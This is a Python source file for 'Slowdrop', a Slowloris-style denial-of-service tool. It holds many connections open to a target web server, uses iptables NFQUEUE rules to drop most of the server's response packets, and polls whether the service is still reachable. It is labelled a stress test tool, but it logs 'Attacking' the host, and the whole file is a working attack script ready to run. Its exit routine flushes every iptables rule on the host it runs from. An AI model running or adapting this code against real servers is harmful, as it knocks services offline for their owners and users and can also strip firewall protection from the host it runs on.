from __future__ import print_function

import argparse
import logging
import random
import socket
import sys
import time
import os

import threading
from netfilterqueue import NetfilterQueue
from scapy.all import *

BASE_PORT = 50000
opened_socket = 0
count_deter = None
counter_packet = {'accepted': 0, 'dropped': 0}


class ShellColors:
    GREEN = '\033[1;32m'
    RED = '\033[1;31m'
    ENDC = '\033[0m'


parser = argparse.ArgumentParser(
    description="Slowloris, low bandwidth stress test tool for websites"
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument("-u", "--url", default="/", help="URL of resource")
parser.add_argument(
    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=150,
    help="Number of sockets to use in the test",
    type=int,
)
parser.add_argument("-DS", "--drop-style", default="random", help="Policy of dropping. Can be 'random' or 'deter'")
parser.add_argument(
    "-v", "--verbose", dest="verbose", action="store_true", help="Increases logging"
)
parser.add_argument("-R", "--drop-rate", default=0.8, help="Drop rate of incoming response. If deterministic drop "
                                                           "style is choosen, it means to accept one packet out of R")
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Randomizes user-agent",
)
parser.add_argument(
    "--https", dest="https", action="store_true", help="Use HTTPS for the requests"
)

parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(https=False)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

if args.verbose:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG,
    )
else:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.INFO,
    )

if args.https:
    logging.info("Importing ssl module")
    import ssl

list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]


def random_drop(pkt):
    r = args.drop_rate
    rand = random.random()
    '''
    packet_rcved = IP(pkt.get_payload())
    if packet_rcved['TCP'].flags & 0x01 == 1 or packet_rcved['TCP'].flags & 0x04 == 1:
        print(packet_rcved.dport, packet_rcved['TCP'].flags)
    '''
    if rand >= float(r):
        pkt.accept()
        counter_packet['accepted'] += 1
        #logging.info("packet accepted")
    else:
        pkt.drop()
        counter_packet['dropped'] += 1
        #logging.info("packet dropped")


def deterministic_drop(pkt):
    global count_deter
    r = int(args.drop_rate)
    packet_rcved = IP(pkt.get_payload())
    index = packet_rcved.dport - BASE_PORT
    count_deter[index] = (count_deter[index]+1) % r
    if count_deter[index] == 0:
        #print("Socket n." + str(index) + ShellColors.GREEN + "\tACCEPT" + ShellColors.ENDC + ", count: " + str(count_deter[index]))
        pkt.accept()
        counter_packet['accepted'] += 1
    else:
        #print("Socket n." + str(index) + ShellColors.RED + "\tDROP" + ShellColors.ENDC + ", count: " + str(count_deter[index]))
        pkt.drop()
        counter_packet['dropped'] += 1


def run_queue(queue):
    queue.run()


def run_thread(ip, url, socket_count):
    for i in range(socket_count):
        s = None
        try:
            logging.debug("Creating socket nr %s", i)
            s = init_socket(ip, url, i)
        except socket.error as err:
            logging.debug(err)

        list_of_sockets.insert(i, s)


def send_req(sock, method, url, host_header='Pippozzo'):
    sock.send(str(method + " " + url + " HTTP/1.1\r\n").encode("utf-8"))
    sock.send("{}\r\n".format("Host: " + host_header).encode("utf-8"))
    if args.randuseragent:
        sock.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        sock.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    sock.send("{}\r\n".format("Accept: text/html,video/mp4").encode("utf-8"))
    sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    sock.send("{}\r\n".format("Accept-encoding: gzip, deflate").encode("utf-8"))
    sock.send("\r\n".encode("utf-8"))


def init_socket(ip, url, index):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # s.settimeout(5)
    if args.https:
        s = ssl.wrap_socket(s)

    # Sockets will use port number from 50000
    s.bind(("", BASE_PORT+index))
    try:
        s.connect((ip, args.port))

        os.system('iptables -I INPUT -p tcp --dport ' + str(BASE_PORT + index) + ' -s ' + str(
            ip) + ' -j NFQUEUE --queue-num ' + str(BASE_PORT))
        global opened_socket
        opened_socket += 1

        send_req(s, "GET", url)
    except socket.error as e:
        logging.warning("Socket %s connection error: %s", index, e)

    return s


def main():
    print(ShellColors.GREEN + "***Slowdrop***" + ShellColors.ENDC)
    ip = args.host
    socket_count = args.sockets
    url = args.url
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Binding iptables queues to callbacks and run threads...")
    global count_deter
    count_deter = [0 for i in range(socket_count)]
    nfqueue = NetfilterQueue()
    if args.drop_style == 'random':
        nfqueue.bind(BASE_PORT, random_drop)
    elif args.drop_style == 'deter':
        if float(args.drop_rate) < 1:
            args.drop_rate = 5
        nfqueue.bind(BASE_PORT, deterministic_drop)
    else:
        print("Wrong drop style. (random or deter)")
        parser.print_help()
        sys.exit(1)

    queue_thread = threading.Thread(target=run_queue, args=(nfqueue, ))
    queue_thread.daemon = True
    queue_thread.start()

    thread = threading.Thread(target=run_thread, args=(ip, url, socket_count, ))
    thread.daemon = True
    thread.start()

    available = True
    while True:
        try:
            s_test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_test.settimeout(0.5)
            tmp = None
            try:
                s_test.connect((ip, args.port))
                send_req(s_test, 'HEAD', url)
                tmp = s_test.recv(1024)
                available = True
            except (socket.timeout, socket.error):
                available = False
            finally:
                s_test.close()

            time.sleep(1)
            print("Open Sockets:\t\t" + str(opened_socket))
            print("Accepted Packets:\t" + str(counter_packet['accepted']))
            print("Dropped Packets:\t" + str(counter_packet['dropped']))
            if tmp is not None:
                print("Response:\t\t" + str(tmp[9:tmp.find("\n")]))
            else:
                print("Response:\t\tNone")
            if available:
                print("Service Available:\t" + ShellColors.GREEN + str(available) + ShellColors.ENDC)
            else:
                print("Service Available:\t" + ShellColors.RED + str(available) + ShellColors.ENDC)
            print()

        except (KeyboardInterrupt, SystemExit):
            logging.info(ShellColors.RED + "Stopping Slowdrop" + ShellColors.ENDC)
            break

    for i in range(len(list_of_sockets)):
        try:
            list_of_sockets[i].close()
        except AttributeError as msg:
            # When trying to call close() on None object
            #logging.warning("Error closing socket %s: " + str(msg), i)
            pass
        except socket.error as msg:
            logging.warning("Error closing socket %s: " + str(msg), i)

    #To clean all rules created. ATTENTION: delete all the user defined rules
    os.system('iptables -F')


if __name__ == "__main__":
    main()
